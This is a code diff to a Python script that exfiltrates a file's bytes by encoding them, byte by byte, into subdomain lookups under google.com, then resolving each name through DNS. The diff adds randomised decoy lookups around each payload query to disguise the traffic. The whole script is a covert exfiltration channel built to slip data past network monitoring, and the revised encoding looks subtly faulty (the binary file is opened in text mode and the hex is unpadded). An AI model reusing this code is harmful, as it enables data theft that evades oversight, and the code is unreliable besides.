@@ -1,18 +1,25 @@
 import socket
 import random
 
-f = open('QRcode.bmp', 'rb')
+MAX_NOISE_COUNT = 3
+
+f = open('QRcode.bmp', 'r')
 payload = f.read();
 f.close();
 
 message = '\S' + payload + '\E'
-message = message.encode('hex')
+message = message.encode()
 print(message)
 
-for b in range(0, len(message), 2):
-    send = 'a' + 'EF' + message[b] + message[b+1] + '.google.com'
+for b in range(len(message)):
+    send = 'a' + 'EF' + format(message[b], 'x') + '.google.com'
     print(send)
-    # inject 0 to 3 amounts of noise into the pipe
-    for i in range(random.randint(0, 3)):
+
+    # inject 1 to X amounts of noise into the pipe
+    for i in range(random.randint(1, MAX_NOISE_COUNT)):
         socket.gethostbyname("google.com")
-    addr = socket.gethostbyname(send)
+    # inject our payload
+    socket.gethostbyname(send)
+    # inject 0 to X amounts of noise into the pipe
+    for i in range(random.randint(0, MAX_NOISE_COUNT)):
+        socket.gethostbyname("google.com")
